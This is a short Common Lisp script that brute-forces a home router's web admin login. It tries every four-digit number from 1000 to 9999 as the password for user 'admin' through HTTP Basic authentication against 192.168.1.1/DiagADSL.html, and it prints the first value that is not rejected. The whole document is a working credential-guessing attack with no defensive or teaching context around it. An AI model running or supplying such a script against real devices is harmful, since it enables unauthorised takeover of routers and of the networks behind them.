#!/usr/bin/clisp
(load '/usr/share/common-lisp/source/cl-base64/package.lisp)
(load '/usr/share/common-lisp/source/cl-base64/encode.lisp)
(setf cnt 0)
(loop for i from 1000 to 9999 do 
	 (with-open-stream 
		(s (socket-connect 80 "192.168.1.1" :EXTERNAL-FORMAT :DOS))
		(format s "GET /DiagADSL.html HTTP/1.0~%")
		(format s "Authorization: Basic ~a~2%" 
			(cl-base64:string-to-base64-string 
			(concatenate 'string "admin:" (write-to-string i))))
		(setf res (read-line s NIL NIL))

		(setf cnt (+ cnt 1))
		(when (= 9 cnt) 
			(setf cnt 0) 
			(format *standard-output* "."))
		(when (not (eql (char res 11) #\1)) 
			(write-line (concatenate 'string "FOUND: " 
				(write-to-string i))) (exit))
		))


	
